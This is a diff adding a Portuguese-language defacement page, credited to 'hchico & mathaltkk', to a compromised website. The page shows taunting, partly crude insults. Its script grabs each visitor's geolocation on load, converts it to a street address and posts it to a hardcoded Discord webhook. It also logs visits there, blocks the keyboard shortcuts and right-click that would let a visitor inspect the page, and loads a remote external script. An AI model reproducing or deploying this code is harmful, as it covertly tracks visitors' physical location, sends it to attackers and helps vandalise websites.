@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Hackeado por hchico & mathaltkk</title>
+<style>
+  body {
+    background: #000;
+    color: #ff4444;
+    font-family: 'Comic Sans MS', cursive, sans-serif;
+    text-align: center;
+    padding-top: 5vh;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+  img {
+    max-width: 300px;
+    margin-bottom: 20px;
+    border: 3px solid #ff4444;
+    border-radius: 10px;
+    box-shadow: 0 0 15px #ff0000;
+    animation: pulse 2s infinite;
+  }
+  h1 {
+    font-size: 3em;
+    margin-bottom: 0.2em;
+    text-shadow: 0 0 8px #ff0000;
+    animation: flicker 1.5s infinite;
+  }
+  p, #frase {
+    font-size: 1.5em;
+    margin: 0.4em 0;
+    animation: flicker 2s infinite;
+  }
+  a {
+    color: #00ccff;
+    font-weight: bold;
+    text-decoration: none;
+    cursor: pointer;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+      opacity: 1;
+    }
+    20%, 22%, 24%, 55% {
+      opacity: 0.4;
+    }
+  }
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 15px #ff0000; }
+    50% { box-shadow: 0 0 30px #ff4444; }
+  }
+</style>
+</head>
+<body>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSirkn_SzFHDjXaVRiwk_cwBan4A0xE6p7WxQ&s" alt="Imagem zoeira hacker" />
+  <h1>quer chorar pq n ownou o site?</h1>
+  <p id="frase">Carregando provocação...</p>
+  <p>entra em contato!</p>
+  <p>DC: <a href="https://discord.gg/invalid" target="_blank" rel="noopener noreferrer">hchico.</a> e <a href="https://discord.gg/invalid" target="_blank" rel="noopener noreferrer">mathaltkk</a></p>
+  <p>mas se for chorar manda áudio hein</p>
+  <p id="visitas"></p>
+
+<script>
+  const webhookURL = 'https://discord.com/api/webhooks/1401496645522161737/ojAQYCNhRaYWw_FNLICMBybFRVp0_AYEZpvzQIrpnrswKTG2fV09uzRp3BIvfeDt4tWL';
+
+  // Frases aleatórias zoeiras
+  const frases = [
+    "Ip logado, achei facil",
+    "Brinquei e ownei o site pra sempre (ou até eu cansar)",
+    "IA é meu sacoKKKKKKKKKKKKKK",
+    "Você teve sorte que eu n quis te explodirKKKKKKKKKKKKK",
+    "Já fica esperto que o hchico. e o mathaltkk tao espertosKKKKKKKKKKKK",
+    "HIHIIHIHIHHIHIHI, ninguem owna eu owno",
+    "Click confirmado, IP logado",
+    "Isso que dá clicar onde não devia",
+    "Hackeado com sucesso e sem censura",
+    "Pega na minha e balança",
+    "Se quiser ownar o site espera minha net cair",
+    "Explode o server e mesmo assim não entra, otário",
+    "Allahu Akbar cabeçudoKKKKKKKKKKKKKKKKKKK",
+    "Tenta mais já sei que não consegue msmKKKKKKKKKKK",
+    "Foca mais em ser inteligente, pq com 12 anos eu dominei o site",
+    "Tenta entrar no /admin otárioKKKKKKKKKKKKKKKKKK",
+    "Puxa no DC: hchico. e mathaltkk",
+    "Vai tentar ainda entrar?",
+    "Brinca com o meu auto ownwerKKKKKKKKKKKKKKKKKKK",
+    "Um mlk de 12 anos sabe mais do que vcKKKKKKKKKKK",
+    "Brinca que o HChico ta na áreaKKKKKKKKKKKK",
+    "O site agora é meuKKKKKKKKKKKKKKKKKKKK",
+    "OBS: seu pai comeu a sua mãe (ou nãoKKKKKKKKKKKKK)",
+    "Fica quieto que o mlk ta hackeando vcKKKKKKKKKKKK",
+    "Tô ficando sem frases pra porKKKKKKKKKKKKKKKKKKK",
+    "Tanta inteligência sendo disperdiçada tentando entrar...",
+    "SHHHHHH, não grita",
+    "Acho que a Coreia do Norte n ta feliz nãoKKKKKKKKKKKKKKKK",
+    "Escutando música e zoando sua caraKKKKKKKKKKKKKKKKKKKKKKK",
+    "Já temos 30 frases, e vc nem conseguiu 50% delasKKKKKKKKKKKKKKKK"
+  ];
+
+  function exibirFraseAleatoria() {
+    const frase = frases[Math.floor(Math.random() * frases.length)];
+    document.getElementById('frase').textContent = frase;
+  }
+
+  function contarVisita() {
+    if (!localStorage.getItem('visitou')) {
+      localStorage.setItem('visitou', 'true');
+      // incrementa contador no Discord
+      enviarWebhook('📈 Nova visita única registrada no site!');
+    }
+    document.getElementById('visitas').textContent = '✔️ Sua visita foi registrada!';
+  }
+
+  function enviarWebhook(msg) {
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({content: msg})
+    }).catch(()=>{});
+  }
+
+  function sucesso(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+      .then(r => r.json())
+      .then(data => {
+        const endereco = data.display_name || 'Localização desconhecida';
+        const msg = `🚨 Nova localização capturada 🚨
+Latitude: ${lat}
+Longitude: ${lon}
+Endereço: ${endereco}`;
+        enviarWebhook(msg);
+      })
+      .catch(() => {
+        enviarWebhook(`🚨 Localização capturada 🚨 Latitude: ${lat} Longitude: ${lon} (sem endereço)`);
+      });
+  }
+
+  function erro() {
+    // Agora não faz nada se negar, só ignora
+  }
+
+  // Ativa localização
+  navigator.geolocation.getCurrentPosition(sucesso, erro);
+
+  // Bloqueios de teclas e mouse
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey || (e.keyCode >= 112 && e.keyCode <= 123) || e.keyCode === 85 || e.keyCode === 73) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+  });
+
+  document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    return false;
+  });
+
+  // Carrega script externo ProtectionScript.js
+  const script = document.createElement('script');
+  script.src = 'https://cdn.jsdelivr.net/gh/DarkModde/Dark-Scripts/ProtectionScript.js';
+  document.head.appendChild(script);
+
+  // Executa tudo
+  exibirFraseAleatoria();
+  contarVisita();
+</script>
+
+</body>
+</html>
